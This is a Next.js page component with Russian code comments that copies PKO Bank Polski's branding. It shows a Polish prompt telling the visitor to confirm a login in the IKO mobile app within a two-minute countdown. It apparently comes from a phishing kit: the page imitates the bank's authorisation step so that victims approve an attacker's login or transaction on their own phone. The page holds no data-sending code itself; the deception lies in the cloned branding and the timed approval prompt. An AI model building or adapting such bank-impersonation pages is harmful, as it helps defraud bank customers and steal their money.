// app/nextpage/page.tsx
"use client";

import { useEffect, useState } from "react";
import Image from "next/image";
import "./sms.css";

const BANKS: Record<
  string,
  { name: string; logo: string; primaryColor: string }
> = {
  pko: {
    name: "PKO Bank Polski",
    logo: "/banks/pko-bp.svg",
    primaryColor: "#da251d",
  },
};

const bank = BANKS["pko"];

export default function NextPage() {
  const [timeLeft, setTimeLeft] = useState(120); // сколько секунд нужно

  function formatTime(sec: number) {
  const m = Math.floor(sec / 60);
  const s = sec % 60;
  return `${m}:${s.toString().padStart(2, "0")}`;
  } 

  useEffect(() => {
    if (timeLeft <= 0) return;

    const interval = setInterval(() => {
      setTimeLeft(prev => prev - 1);
    }, 1000);

    return () => clearInterval(interval);
  }, [timeLeft]);


  return (
    <div className="page-sms">
      <header className="navbar">
        <div className="navbar-inner">
          <Image className="logo-sms" src={bank.logo} alt={bank.name} width={180} height={60}/>
        </div>
      </header>

      {/* СЕРАЯ ПОЛОСА ПОСЛЕ НАВБАРА */}
      <div className="nav-separator" />

      {/* ГЛАВНЫЙ ЦЕНТРАЛЬНЫЙ БЛОК 1230px */}
      <main className="main-container">
        {/* Заголовок */}
        <h1 className="page-title">Potwierdz logowanie do serwisu</h1>

        <div className="info-box">
          {/* Иконку потом заменишь на свою картинку */}
          <Image src="/shield-check.svg" alt="info-icon" className="info-icon" width={24} height={24} />
          <p className="info-text">
            Korzystasz z urządzenia niezaufanego, dlatego prosimy Cię o potwierdzenie logowania Twoim
narzędziem autoryzacji.
          </p>
        </div>

        {/* Серая линия по ширине главного блока */}
        <div className="main-divider" />

        {/* Внизу: слева кнопка, справа текст + иконка */}
        <div className="bottom-row">
          <div></div>

          <div className="bottom-right">
            <div className="right-top-row">
              <span className="bottom-text">Zatwierdź operację w aplikacji mobilnej IKO</span>
            </div>

            <p className="timer-text">
              Masz<span className="timer-number">{formatTime(timeLeft)} </span> min na zatwierdzenie operacji na urzadzeniu
            </p>
            
          </div>
          <Image src="/sms-logo.svg" alt="sms-icon" className="sms-icon" width={100} height={100} />
        </div>
      </main>


      {/* ФУТЕР, ВЫСОТА КАК НА ПРОШЛОЙ СТРАНИЦЕ (64px) */}
      <div className="footer-sms">
          <div className="footer-text-sms">
            <span>© 2025 PKO Bank Polski</span>
            <span>Kod BIC (Swift): BPKOPLPW</span>
            <span>Polityka prywatności</span>
          </div>
          
        </div>
      <div className="footer-line"></div>

    </div>
  );
}
